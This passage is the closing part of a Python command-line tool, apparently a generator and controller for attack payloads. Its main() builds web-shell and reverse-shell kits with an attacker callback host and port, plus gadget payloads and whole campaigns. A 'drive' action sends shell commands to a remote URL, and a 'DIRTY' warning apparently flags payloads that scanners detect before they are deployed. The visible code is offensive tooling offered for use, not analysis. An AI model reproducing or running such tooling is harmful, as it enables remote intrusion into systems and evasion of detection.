            print(f"{k:14}  {spec['name']:16}  {spec['group']:4}  {need}")
        return 0

    if args.action == "make":
        _check_target(args.target)
        rec = forge(
            [args.kind],
            dest=_dest(args.case, args.out),
            key=_key(args.key),
            lhost=args.lhost,
            lport=args.lport,
        )
    elif args.action == "kit":
        _check_target(args.target)
        if args.web_only:
            kinds = [k for k, s in KINDS.items() if s["group"] == "web"]
        elif args.rev_only:
            kinds = [k for k, s in KINDS.items() if s["group"] == "rev"]
        else:
            kinds = [k for k, s in KINDS.items() if s["group"] in ("web", "rev")]
        rec = forge(
            kinds,
            dest=_dest(args.case, args.out),
            key=_key(args.key),
            lhost=args.lhost,
            lport=args.lport,
        )
    elif args.action == "gadgets":
        rec = forge(
            [k for k, s in KINDS.items() if s["group"] == "gad"],
            dest=_dest(args.case, args.out),
            key=_key(""),
            lhost="",
            lport=0,
        )
    elif args.action == "campaign":
        _check_target(args.target)
        rec = run_campaign(
            _dest(args.case, args.out),
            key=_key(args.key),
            lhost=args.lhost,
            lport=args.lport,
        )
    elif args.action == "drive":
        rec = drive(args.url, args.key, args.a, cmd=args.shell_cmd, path=args.path, data=args.data)
        if getattr(args, "json", False):
            print(json.dumps(rec, ensure_ascii=False, indent=2))
        else:
            print(f"HTTP  {rec['status']}  {rec['url']}")
            print(rec["body"])
        return 0 if rec.get("ok") else 1
    else:
        ap.error("需要 list / make / kit / gadgets / campaign / drive / --self-test")
        return 2

    if getattr(args, "json", False):
        print(json.dumps(rec, ensure_ascii=False, indent=2))
    else:
        print(f"DIR   {rec['dir']}")
        print(f"KEY   {rec['key']}")
        if rec["lhost"]:
            print(f"CB    {rec['lhost']}:{rec['lport']}")
        for it in rec["items"]:
            print(f"  [{it['scan']}] {it['kind']:10}  {it['file']}")
        print(f"USE   {rec['use']}")
        if rec["dirty"]:
            print("DIRTY 先改再落地: " + ",".join(rec["dirty"]))
            return 3
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
